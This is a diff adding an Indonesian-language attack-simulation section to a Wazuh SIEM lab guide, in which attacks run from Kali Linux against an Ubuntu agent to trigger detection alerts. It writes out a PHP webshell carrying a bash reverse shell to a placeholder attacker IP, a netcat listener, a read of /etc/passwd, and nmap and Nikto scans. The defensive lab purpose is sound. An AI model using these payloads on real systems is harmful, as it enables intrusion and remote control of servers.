@@ -496,6 +496,70 @@ sudo chmod 750 /var/ossec/integrations/custom-telegram*</code></pre>
     </li>
   </ol>
 </details>
+    <h2>4.4 Simulasi Serangan</h2>
+
+<details>
+  <summary><strong>a. Webshell Attack</strong></summary>
+  <p>
+    <strong>Webshell</strong> adalah skrip berbahaya yang diunggah ke server web untuk memberikan akses kendali jarak jauh kepada penyerang. Pada simulasi ini, serangan dilakukan dari Kali Linux ke Ubuntu Agent.
+  </p>
+
+  <ol>
+    <li>Buat file skrip:
+      <pre><code>touch /var/www/html/webshell-script.php</code></pre>
+    </li>
+    <li>Isi file dengan konten sederhana:
+      <pre><code>echo 'Hello world!' > /var/www/html/webshell-script.php</code></pre>
+    </li>
+    <li>Ganti dengan skrip reverse shell:
+      <pre><code>echo -e "&lt;?php exec('/bin/bash -c \\"bash -i &gt;&amp; /dev/tcp/&lt;KALI_IP&gt;/4444 0&gt;&amp;1\\"');?&gt;" &gt; /var/www/html/webshell-script.php</code></pre>
+    </li>
+    <li>Dari Kali Linux, jalankan listener:
+      <pre><code>nc -lvp 4444</code></pre>
+    </li>
+    <li>Akses melalui browser:
+      <pre><code>http://&lt;UBUNTU_IP&gt;/webshell-script.php</code></pre>
+    </li>
+    <li>Koneksi akan terbentuk di Kali Linux, jalankan perintah seperti:
+      <pre><code>whoami
+cat /etc/passwd</code></pre>
+    </li>
+    <li>Cek dasbor Wazuh:
+      <img src="./webshell.png" alt="Alert Webshell Wazuh" style="max-width:100%; margin-top:1rem; border:1px solid #ddd; border-radius:6px;" />
+    </li>
+  </ol>
+</details>
+
+<details>
+  <summary><strong>b. Nmap Scan</strong></summary>
+  <p>
+    <strong>Nmap</strong> digunakan untuk melakukan pemindaian terhadap endpoint Ubuntu Agent dari Kali Linux.
+  </p>
+
+  <pre><code>sudo nmap -sS --script=vuln &lt;AGENT_IP&gt;</code></pre>
+
+  <p>
+    Serangan ini akan memicu <strong>active response</strong> dari Wazuh berupa perintah <code>firewall-drop</code> untuk memblokir IP selama 180 detik.
+  </p>
+
+  <img src="./nmap.png" alt="Alert Nmap Wazuh" style="max-width:100%; margin-top:1rem; border:1px solid #ddd; border-radius:6px;" />
+</details>
+
+<details>
+  <summary><strong>c. Web Attack (Nikto)</strong></summary>
+  <p>
+    Gunakan <strong>Nikto</strong> dari Kali Linux untuk menyerang web server yang rentan:
+  </p>
+
+  <pre><code>nikto -h http://&lt;AGENT_IP&gt;/</code></pre>
+
+  <p>
+    Setelah serangan, Wazuh akan menganalisis log dari server dan menghasilkan alert berdasarkan rule default atau dari integrasi Teler.
+  </p>
+
+  <img src="./webattack.png" alt="Alert Web Attack Wazuh" style="max-width:100%; margin-top:1rem; border:1px solid #ddd; border-radius:6px;" />
+</details>
+
   </main>
 </body>
 </html>
